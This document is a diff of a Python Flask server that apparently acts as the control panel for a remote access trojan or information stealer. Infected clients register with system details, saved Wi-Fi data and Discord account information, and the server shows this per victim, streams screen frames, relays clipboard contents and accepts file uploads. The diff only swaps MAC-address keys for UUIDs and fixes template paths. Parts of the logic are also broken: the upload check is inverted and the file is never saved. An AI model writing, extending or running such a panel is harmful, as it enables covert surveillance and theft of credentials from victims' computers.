@@ -10,25 +10,22 @@ last_frame = {}
 screen_last_frame = {}
 
 clients = {}
-def mac_to_client(client_id):
+def uuid_to_client(client_id):
 	for key, value in clients.items():
-		if value.get('clientId') == client_id:
-			print(key)
+		if str(value.get('clientId')) == str(client_id):
 			return key
-
-	return None
 
 @app.route('/', methods=['GET'])
 def mainSite():
-	return render_template('templates/main.html', client = clients, Maxclients = len(clients))
+	return render_template('main.html', client = clients, Maxclients = len(clients))
 
 @app.route('/client/<int:clientId>', methods=['GET'])
 def client1(clientId):
-	clientid = mac_to_client(clientId)
+	clientid = uuid_to_client(clientId)
 	systemInfo = clients[clientid]["systemInfo"]
 	wifis = clients[clientid]["wifis"]
 	discordinfo = clients[clientid]["discordInfo"]
-	return render_template(f'templates/client.html', clientId = clientId, systeminfo=systemInfo, Wifis=wifis, Discordinfo=discordinfo)
+	return render_template(f'client.html', clientId = clientId, systeminfo=systemInfo, Wifis=wifis, Discordinfo=discordinfo)
 
 @app.route('/client', methods=['GET', 'POST'])
 def regclient():
@@ -36,13 +33,13 @@ def regclient():
 
 	if request.method == 'POST':
 		json = request.json
-		if not json['mac'] in clients:
+		if not json['uuid'] in clients:
 			clientId = randint(1000,9999)
-			clients[json['mac']] = {"clientId": clientId,"systemInfo": json['osInfo'],"clientClipboard": "", "wifis": json['wifis'], "discordInfo": json['discordInfo']}
-			print(clients[json['mac']])
+			clients[json['uuid']] = {"clientId": clientId,"systemInfo": json['osInfo'],"clientClipboard": "", "wifis": json['wifis'], "discordInfo": json['discordInfo']}
+			print(clients[json['uuid']])
 		else:
-			clientId = clients[json['mac']]['clientId']
-			print(f"{clients[json['mac']]} arleady in clients!")
+			clientId = clients[json['uuid']]['clientId']
+			print(f"{clients[json['uuid']]} arleady in clients!")
 
 		return Response(str(clientId))
 
@@ -110,7 +107,7 @@ def get_screen_frame():
 @app.route('/send_clipboard', methods=['POST'])
 def send_console():
 	clientId = request.args.get('id')
-	clientid = mac_to_client(clientId)
+	clientid = uuid_to_client(clientId)
 	message = request.json['text']
 	if clientid in clients:
 		clipboard = clients[clientid]['clientClipboard']
@@ -122,7 +119,7 @@ def send_console():
 @app.route('/get_clipboard', methods=['GET'])
 def get_console():
 	clientId = request.args.get('id')
-	clientid = mac_to_client(clientId)
+	clientid = uuid_to_client(clientId)
 	if clientid in clients:
 		console = clients[clientid]['clientClipboard']
 		return console
@@ -135,16 +132,16 @@ def upload_file():
 	if 'file' not in request.files:
 		print(request.files)
 		return "No file part"
-	if 'mac_address' in request.json:
-		return "No mac address"
+	if 'uuid' in request.json:
+		return "No uuid"
 	file = request.files['file']
 	if file.filename == '':
 		return "No file name specified"
 
-	mac_address = request.json['mac_address']
+	uuid = request.json['uuid']
 	filename = secure_filename(file.filename)
 
-	os.path.join('upload', mac_address, filename)
+	os.path.join('upload', uuid, filename)
 	return "File uploaded successfully"
 
 
